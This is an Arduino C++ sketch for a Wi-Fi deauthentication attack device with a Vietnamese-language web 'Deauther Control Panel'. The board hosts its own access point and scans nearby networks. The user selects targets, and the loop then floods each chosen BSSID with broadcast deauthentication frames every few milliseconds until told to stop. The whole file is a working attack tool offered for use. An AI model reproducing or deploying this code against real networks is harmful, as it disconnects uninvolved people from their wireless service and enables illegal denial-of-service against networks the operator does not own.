#include <Arduino.h>
#undef rand
#undef srand
#undef abs
#undef round
#undef max
#undef min

#ifndef _GLIBCXX_USE_CXX11_ABI
#define _GLIBCXX_USE_CXX11_ABI 0
#endif
#ifndef _GLIBCXX_NO_RANDOM_SHUFFLE
#define _GLIBCXX_NO_RANDOM_SHUFFLE 1
#endif
#ifndef random_shuffle
#define random_shuffle DO_NOT_USE_random_shuffle
#endif

#include <vector>
#include <cstdlib>
#include <algorithm>
#include <random>
#include <map>
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

//**************
//APDHY
//*************

// WiFi AP credentials
char *ssid = (char *)"Deauther";
char *pass = (char *)"apdhy";

// WiFi Scan State
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;
std::vector<WiFiScanResult> scan_results;
int current_channel = 1;

// Attack State
bool deauth_running = false;
uint16_t deauth_reason = 1;
std::vector<int> deauth_targets;
std::vector<int> stopped_targets;

// Globals
WiFiServer server(80);
static const uint8_t broadcast_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// Non-Blocking Timers
unsigned long last_attack_time = 0;
const unsigned long ATTACK_INTERVAL = 5; // Tấn công liên tục mỗi 5ms

// Forward declarations
String makeRedirect(String url);

// WiFi Scan Handler
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(500);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

// Use std::multimap to handle multiple selections with the same name
std::multimap<String, String> parsePost(String &request) {
    std::multimap<String, String> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) return post_params;
    body_start += 4;
    String post_data = request.substring(body_start);
    size_t start = 0;
    while (start < post_data.length()) {
        int end = post_data.indexOf('&', start);
        if (end == -1) end = post_data.length();
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');
        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.insert(std::make_pair(key, value));
        }
        start = end + 1;
    }
    return post_params;
}

// Helper function to parse multi-select form data
std::vector<int> parseMultiSelect(const std::multimap<String, String>& post_data, const String& key) {
  std::vector<int> res;
  auto range = post_data.equal_range(key);
  for (auto it = range.first; it != range.second; ++it) {
    res.push_back(it->second.toInt());
  }
  return res;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "; charset=UTF-8\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url + "\n\n";
  return response;
}

void handleRoot(WiFiClient &client) {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="vi">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauther Control Panel</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
      :root { --main-bg: #1a1a1d; --card-bg: #232526; --primary-glow: #00ffc3; --secondary-glow: #00e3ff; --text-color: #e0e0e0; }
      body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #161a1d, #232526); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; color: var(--text-color); overflow-x: hidden; }
      .container { width: 100%; max-width: 900px; animation: fadeIn 1s ease-in-out; }
      @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
      .header { text-align: center; margin-bottom: 40px; }
      .header h1 { font-size: 2.8em; font-weight: 700; letter-spacing: 3px; background: linear-gradient(90deg, var(--primary-glow), var(--secondary-glow), var(--primary-glow)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rainbow 4s linear infinite; }
      @keyframes rainbow { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
      .card { background: rgba(25, 33, 34, 0.95); border-radius: 20px; padding: 25px; margin-bottom: 30px; box-shadow: 0 0 30px rgba(0, 255, 195, 0.2); border: 1px solid rgba(0, 255, 195, 0.3); }
      .card h2 { color: var(--secondary-glow); margin-top: 0; border-bottom: 1px solid rgba(0, 255, 195, 0.2); padding-bottom: 10px; }
      .table-container { overflow-x: auto; }
      table { width: 100%; border-collapse: collapse; margin-top: 15px; }
      th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
      th { background: -webkit-linear-gradient(45deg, var(--primary-glow), var(--secondary-glow)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
      tr:hover { background-color: rgba(0, 255, 195, 0.05); }
      button { font-size: 1em; padding: 12px 28px; background: linear-gradient(90deg, var(--primary-glow), var(--secondary-glow)); border: none; color: #1a1a1d; border-radius: 8px; font-weight: bold; cursor: pointer; margin: 10px 5px; transition: all 0.3s ease; box-shadow: 0 0 15px rgba(0, 255, 195, 0.3); }
      button:hover { transform: translateY(-3px); box-shadow: 0 0 25px rgba(0, 255, 195, 0.6); }
      .button-stop { background: linear-gradient(90deg, #ff416c, #ff4b2b); box-shadow: 0 0 15px rgba(255, 65, 108, 0.3); }
      .button-stop:hover { box-shadow: 0 0 25px rgba(255, 65, 108, 0.6); }
      select { width: 100%; padding: 12px; background: var(--card-bg); color: var(--text-color); border: 2px solid rgba(0, 255, 195, 0.3); border-radius: 8px; font-size: 1em; margin-top: 10px; transition: all 0.3s ease; }
      select:focus { border-color: var(--primary-glow); box-shadow: 0 0 15px rgba(0, 255, 195, 0.3); outline: none; }
      .status { display: flex; align-items: center; justify-content: center; padding: 15px; border-radius: 8px; margin-top: 20px; font-size: 1.1em; font-weight: bold; }
      .status.running { background-color: rgba(255, 65, 108, 0.2); color: #ff416c; }
      .status.idle { background-color: rgba(0, 255, 195, 0.2); color: var(--primary-glow); }
      .pulse::before { content: ''; display: inline-block; width: 12px; height: 12px; margin-right: 10px; border-radius: 50%; background-color: currentColor; animation: pulse 1.5s infinite; }
      @keyframes pulse { 0% { box-shadow: 0 0 0 0 currentColor; } 70% { box-shadow: 0 0 0 10px transparent; } 100% { box-shadow: 0 0 0 0 transparent; } }
      .loader { margin: 20px auto; border: 5px solid #2a2a2e; border-top: 5px solid var(--primary-glow); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
      @keyframes spin { 100% { transform: rotate(360deg); } }
      @media (max-width: 600px) { h1 { font-size: 2em; } }
    </style>
  </head>
  <body>
    <div class="container">
      <header class="header"><h1>Deauther Control Panel</h1></header>
  )rawliteral";

  // --- Status Card ---
  html += "<div class='card'>";
  html += "<h2>Trạng Thái Hệ Thống</h2>";
  if (deauth_running) {
    html += "<div class='status running pulse'>Tấn công Deauth đang hoạt động!</div>";
  } else {
    html += "<div class='status idle'>Hệ thống đang ở chế độ chờ.</div>";
  }
  html += "</div>";

  // --- Target List Card ---
  html += "<div class='card'>";
  html += "<h2><form method='post' action='/rescan' style='display:inline;'><button type='submit'>Quét Lại Mạng</button></form>Danh Sách Mục Tiêu</h2>";
  if (scan_results.empty()){
    html += "<div class='loader'></div><p style='text-align:center;'>Đang quét mạng Wi-Fi...</p>";
  } else {
    html += "<div class='table-container'><table><thead><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Kênh</th><th>RSSI</th><th>Tần số</th></tr></thead><tbody>";
    for (size_t i = 0; i < scan_results.size(); i++) {
      html += "<tr><td>" + String(i + 1) + "</td><td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
    }
    html += "</tbody></table></div>";
  }
  html += "</div>";
  
  // --- Attack Control Card ---
  html += "<div class='card'>";
  html += "<h2>Bảng Điều Khiển Tấn Công</h2>";
  html += "<form method='post' action='/deauth'>";
  html += "<label for='net_num_select'>Chọn mục tiêu (giữ Ctrl/Cmd để chọn nhiều):</label>";
  html += "<select name='net_num' id='net_num_select' size='8' multiple required>";
  for (size_t i = 0; i < scan_results.size(); i++) {
    String frequency = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    String displayText = String(i) + " | " + scan_results[i].ssid + " (" + frequency + ")";
    html += "<option value='" + String(i) + "'>" + displayText + "</option>";
  }
  html += "</select><br><br>";
  html += "<button type='submit'>BẮT ĐẦU TẤN CÔNG</button>";
  html += "</form>";
  html += "<form method='post' action='/stop'><button type='submit' class='button-stop'>DỪNG TẤT CẢ</button></form>";
  html += "</div>";

  html += "</div></body></html>";
  client.write((makeResponse(200, "text/html") + html).c_str());
}

void handleStopDeauth(WiFiClient &client) {
  deauth_running = false;
  stopped_targets = deauth_targets; // Save for display if needed
  deauth_targets.clear(); 
  
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_B, HIGH);
  delay(1000);
  digitalWrite(LED_B, LOW);

  client.write(makeRedirect("/").c_str());
}


void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  DEBUG_SER_INIT();
  randomSeed(millis()); 
  
  IPAddress local_ip(192, 168, 4, 1); 
  IPAddress gateway(192, 168, 4, 1);  
  IPAddress subnet(255, 255, 255, 0); 
  WiFi.config(local_ip, gateway, subnet);
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());

  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }
  
  server.begin();
  digitalWrite(LED_G, LOW);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while(client.available()) {
      request += (char) client.read();
    }
    delay(1);
    digitalWrite(LED_G, LOW);
    
    DEBUG_SER_PRINT("Request received.\n");
    String path = parseRequest(request);

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      scanNetworks();
      client.write(makeRedirect("/").c_str());
    } else if (path == "/deauth") {
      std::multimap<String, String> post_data = parsePost(request);
      deauth_targets = parseMultiSelect(post_data, "net_num");
      
      if (!deauth_targets.empty()) {
        deauth_reason = random(1, 8); // Random reason from 1-7
        deauth_running = true;
        DEBUG_SER_PRINT("Deauth started on targets.\n");
        digitalWrite(LED_R, HIGH);
        digitalWrite(LED_B, HIGH);
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/stop") {
      handleStopDeauth(client);  
    } else {
      client.write(makeRedirect("/").c_str());
    }
  }

  // Non-blocking attack logic
  if (deauth_running) {
    if (millis() - last_attack_time > ATTACK_INTERVAL) {
      last_attack_time = millis();
      for (int target_index : deauth_targets) {
        if (target_index >= 0 && target_index < (int)scan_results.size()) {
          uint8_t target_bssid[6];
          memcpy(target_bssid, scan_results[target_index].bssid, 6);
          wifi_tx_deauth_frame(target_bssid, (void*)broadcast_mac, deauth_reason);
        }
      }
    }
  }
}
